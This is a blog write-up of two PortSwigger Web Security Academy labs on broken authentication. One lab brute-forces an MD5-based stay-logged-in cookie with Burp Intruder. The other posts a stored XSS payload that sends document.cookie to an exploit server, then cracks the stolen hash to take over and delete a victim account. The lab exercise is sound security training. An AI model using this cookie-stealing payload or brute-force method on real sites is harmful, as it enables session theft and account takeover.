---
title: Other vulnerable Authentication Mechanismus
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2022-09-30 09:00:00 +0200
categories: [Web Application, Broken Authentication]
tags: [Notes, Web Application, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the Authentication vulnerabilities or [Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication) if we follow [OWASP](https://owasp.org/) naming scheme. 

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/authentication) Labs, but i do intent do throw other labs and writeups here as well.

# TOC

- [Intro](#intro)
- [TOC](#toc)
- [Brute-forcing a stay-logged-in cookie](#brute-forcing-a-stay-logged-in-cookie)
  - [Abusing `stay-logged-in` mechanismus](#abusing-stay-logged-in-mechanismus)
- [Offline password cracking (weak hash used for remember-me cookie)](#offline-password-cracking-weak-hash-used-for-remember-me-cookie)
  - [Enumeration first!](#enumeration-first)
  - [Exploitation next!](#exploitation-next)
 
# Brute-forcing a stay-logged-in cookie
>  This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.
> 
> To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.
> 
> Your credentials: wiener:peter
> 
> Victim's username: carlos
> 
> [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

Long story short. This is all about the vulnerable `remember me`/`stay-logged-in`functionality.

## Abusing `stay-logged-in` mechanismus

Let's login using `wiener:peter`. 
![picture 92](/assets/images/c3de592df71ec6ed1862aa69f7db5e40afa8f8632db991b0ab92b43699ac07ce.png)

We can see in the response that cookie that is being sent in response includes username and some sort of hash. This md5 hash is password, which is known = `peter`.

This hash persists then in the subsequent requests like `/my-account`. Let's try to bruteforce carlos's password hash in the cookie.

We can use `sniper` mode against `my-account` without session cookie!

For payload we can use the provied password list, we however need do hash he password, add a prefix which is `carlos:` and encode whole thing as base64

![picture 95](/assets/images/5fafc845a3952d4ab27db939c06e0f167ab844f55781c2e1545eb953c9583b29.png)

If everything has been done correctly, Intruder should be able to find the password:

![picture 93](/assets/images/06bf5917d5f0ee71864440174505b15eea3137634a27583c9eb5c91c01e1ed1b.png)  

Lab has been solved

![picture 94](/assets/images/1d7afa7f9c9e75d2410df73c7d5c74d9081b432db69be192ba0a86d089765d64.png)  

# Offline password cracking (weak hash used for remember-me cookie)

> This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.
> 
> Your credentials: wiener:peter
> Victim's username: carlos
> 
> **Learning path**
> 
> !!!!!If you're following our suggested learning path, please note that this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.!!!!!!

## Enumeration first!

Let's login first
![picture 96](/assets/images/4018c68cd599f0f02b42e929a4bba0f73997c1ad0cef417ec395532dba4ab52a.png)  

We're supposed to delete an accout: 
![picture 97](/assets/images/b2fd12ac206bd0a8b983f0bcf5e3ae576d65ebef900d31b69464742355857f93.png)  

If XSS should do cause a deletion, then we'd need a client to request for `/my-account/delete`

We however need to steal the credentials.

## Exploitation next!
For XSS we have a server available:

![picture 98](/assets/images/76f9d6ddf1433f39a0467b27481e77cc5bba2a41619d42e9ead85f8519cd8341.png)  

As we already know that there is a XSS, let's simply leave a message in the comment in one of the posts

![picture 99](/assets/images/6975072d1a762add5aac6bb5df61a0bd29bf82bee7beaed27c37f8d17f1ad285.png)  

Payload:
```
<script>document.location='https://exploit-0a79008a03044c6dc0753916018d0031.web-security-academy.net/c='+document.cookie</script>
```

If we check our Access logs we'd see something there:

![picture 100](/assets/images/c03375535b5c517ff1221cdb1ccd00553065a6d9c5588b4dda34eee461f55a1b.png)  

If we check the `stay-logged-in` token and send it to `Decoder` we can see it's carlos's token:

![picture 101](/assets/images/8ee439d90eaa64cebed1623dd07ae4176ab41657efdc6a7ca1adfccaed54aa25.png)  

Password can be found on google ==> `26323c16d5f4dabff3bb136f2460a943:onceuponatime` for carlos's user.

Now login and delete the Carlos!

![picture 102](/assets/images/c1f0d215900c190e28e00f0b6550e825f69d683aeebea575964f6db7585d7eee.png)  

It would be possible to delete Carlos using XSS, but it was not in focus in this lab!

